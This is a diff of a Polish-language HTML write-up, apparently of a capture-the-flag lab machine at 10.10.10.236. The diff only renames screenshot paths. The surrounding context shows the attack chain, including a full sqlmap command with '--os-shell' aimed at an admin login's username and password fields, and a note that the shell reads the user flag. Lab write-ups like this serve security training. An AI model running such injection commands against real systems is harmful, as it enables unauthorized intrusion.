@@ -311,15 +311,15 @@ Host script results:
 <span style="color:#ae81ff">200</span>      315l      863w    13264c https://10.10.10.236/services.html
 </code></pre></div><hr>
 <h1 id="wappalyzer">Wappalyzer<a hidden class="anchor" aria-hidden="true" href="#wappalyzer">#</a></h1>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210923124006.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210923124006.png" alt=""  />
 </p>
 <hr>
 <h1 id="strona-główna">Strona główna<a hidden class="anchor" aria-hidden="true" href="#strona-główna">#</a></h1>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210923124023.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210923124023.png" alt=""  />
 </p>
 <hr>
 <h1 id="admin-login-page">Admin login page<a hidden class="anchor" aria-hidden="true" href="#admin-login-page">#</a></h1>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210923125334.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210923125334.png" alt=""  />
 </p>
 <hr>
 <h1 id="sqlmap-z-burpsuite">SQLMAP z BurpSuite<a hidden class="anchor" aria-hidden="true" href="#sqlmap-z-burpsuite">#</a></h1>
@@ -359,7 +359,7 @@ Table: users
 <hr>
 <h2 id="próba-uzyskania-shella-przy-pomocy---os-shell-w-sqlmap-koniecznie-z-parametrami">Próba uzyskania shella przy pomocy &ndash;os-shell w sqlmap KONIECZNIE Z PARAMETRAMI<a hidden class="anchor" aria-hidden="true" href="#próba-uzyskania-shella-przy-pomocy---os-shell-w-sqlmap-koniecznie-z-parametrami">#</a></h2>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -r admin.req  --batch --level <span style="color:#ae81ff">5</span> --risk <span style="color:#ae81ff">3</span> -p <span style="color:#e6db74">&#39;username,password&#39;</span> --proxy<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://127.0.0.1:8080&#34;</span> --force-ssl --os-shell --flush-session --time-sec<span style="color:#f92672">=</span><span style="color:#ae81ff">20</span>
-</code></pre></div><p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210923140409.png" alt=""  />
+</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210923140409.png" alt=""  />
 </p>
 <p>Z poziomu tego shella da się odczytać flagę</p>
 <p>user.txt</p>
